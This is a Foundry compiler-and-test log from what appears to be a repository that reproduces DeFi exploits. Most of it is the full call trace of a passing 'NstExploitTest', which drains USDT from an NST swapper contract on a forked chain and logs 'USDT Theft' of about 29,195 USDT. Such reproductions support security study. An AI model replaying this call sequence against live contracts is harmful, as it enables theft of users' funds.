Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.28s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 292.43ms (304.07µs CPU time)

Ran 1 test for src/test/2023-06/NST_exp.sol:NstExploitTest
[PASS] testExploit() (gas: 376144)
Logs:
  USDT Theft 29195083207

Traces:
  [475445] NstExploitTest::testExploit()
    ├─ [30128] USDT::approve(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [24768] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::approve(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [24670] NST::approve(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [3462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [1462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F])
    │   └─ ← [Return] [0xbaab7dbf64751104133af04abc7d9979f0fda3b059a322a8333f533d3f32bf7f, 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03], []
    ├─ [0] VM::load(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
    ├─ [0] VM::load(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [1462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
    ├─ [0] VM::load(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(USDT: [0xc2132D05D31c914a87C6611C10748AEb04B58e8F], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x00000000000000000000000000000000000000000000000000000009502f9000)
    │   └─ ← [Return] 
    ├─ [1462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 40000000000 [4e10]
    │   └─ ← [Return] 40000000000 [4e10]
    ├─ [92932] swapper::6e41592c(00000000000000000000000000000000000000000000000000000009502f9000)
    │   ├─ [1462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   └─ ← [Return] 40000000000 [4e10]
    │   │   └─ ← [Return] 40000000000 [4e10]
    │   ├─ [2607] NST::balanceOf(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88]) [staticcall]
    │   │   └─ ← [Return] 16970491685 [1.697e10]
    │   ├─  emit topic 0: 0x84e96c4170713c5f97132ac2629a2bf96798bcd336c77929a8328b199a1e8950
    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │           data: 0x00000000000000000000000000000000000000000000000000000009502f900000000000000000000000000000000000000000000000000000000000e7441a00
    │   ├─ [12093] USDT::transferFrom(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], 38800000000 [3.88e10])
    │   │   ├─ [11227] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::transferFrom(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], 38800000000 [3.88e10]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], value: 38800000000 [3.88e10])
    │   │   │   ├─ emit Approval(owner: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], value: 115792089237316195423570985008687907853269984665640564039457584007874329639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [12093] USDT::transferFrom(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbb5a92c69355Dd75480e66Db8D07cEA4443CbEa1, 1200000000 [1.2e9])
    │   │   ├─ [11227] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::transferFrom(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbb5a92c69355Dd75480e66Db8D07cEA4443CbEa1, 1200000000 [1.2e9]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xbb5a92c69355Dd75480e66Db8D07cEA4443CbEa1, value: 1200000000 [1.2e9])
    │   │   │   ├─ emit Approval(owner: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], value: 115792089237316195423570985008687907853269984665640564039457584007873129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [24670] NST::approve(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3880000000 [3.88e9])
    │   │   ├─ emit Approval(owner: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], spender: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3880000000 [3.88e9])
    │   │   └─ ← [Return] true
    │   ├─ [30196] NST::transfer(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3880000000 [3.88e9])
    │   │   ├─ emit Transfer(from: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], to: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3880000000 [3.88e9])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000e7441a00
    ├─ [72671] swapper::7cd0599b(00000000000000000000000000000000000000000000000000000000e7441a00)
    │   ├─ [607] NST::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 3880000000 [3.88e9]
    │   ├─ [1462] USDT::balanceOf(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88]) [staticcall]
    │   │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88]) [delegatecall]
    │   │   │   └─ ← [Return] 69195083207 [6.919e10]
    │   │   └─ ← [Return] 69195083207 [6.919e10]
    │   ├─  emit topic 0: 0x8ff1e5cc12a6fdcad2cb258dcbd1fd7d682068b414812ba07052cd603e6d9dee
    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │           data: 0x00000000000000000000000000000000000000000000000000000008c347c90000000000000000000000000000000000000000000000000000000000e7441a00
    │   ├─ [3935] NST::transferFrom(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], 3763600000 [3.763e9])
    │   │   ├─ emit Transfer(from: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], value: 3763600000 [3.763e9])
    │   │   └─ ← [Return] true
    │   ├─ [8735] NST::transferFrom(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbb5a92c69355Dd75480e66Db8D07cEA4443CbEa1, 116400000 [1.164e8])
    │   │   ├─ emit Transfer(from: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xbb5a92c69355Dd75480e66Db8D07cEA4443CbEa1, value: 116400000 [1.164e8])
    │   │   └─ ← [Return] true
    │   ├─ [25628] USDT::approve(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37636000000 [3.763e10])
    │   │   ├─ [24768] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::approve(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37636000000 [3.763e10]) [delegatecall]
    │   │   │   ├─ emit Approval(owner: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], spender: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 37636000000 [3.763e10])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [24398] USDT::transfer(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37636000000 [3.763e10])
    │   │   ├─ [23538] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::transfer(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37636000000 [3.763e10]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], to: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 37636000000 [3.763e10])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000008c347c900
    ├─ [7293] USDT::transferFrom(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 31559083207 [3.155e10])
    │   ├─ [6427] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::transferFrom(swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 31559083207 [3.155e10]) [delegatecall]
    │   │   ├─ emit Transfer(from: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], to: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 31559083207 [3.155e10])
    │   │   ├─ emit Approval(owner: swapper: [0x9D101E71064971165Cd801E39c6B07234B65aa88], spender: NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6076916793 [6.076e9])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [1462] USDT::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(NstExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 69195083207 [6.919e10]
    │   └─ ← [Return] 69195083207 [6.919e10]
    ├─ [0] console::log("USDT Theft", 29195083207 [2.919e10]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 300.09ms (3.05ms CPU time)

Ran 2 test suites in 634.04ms (592.52ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
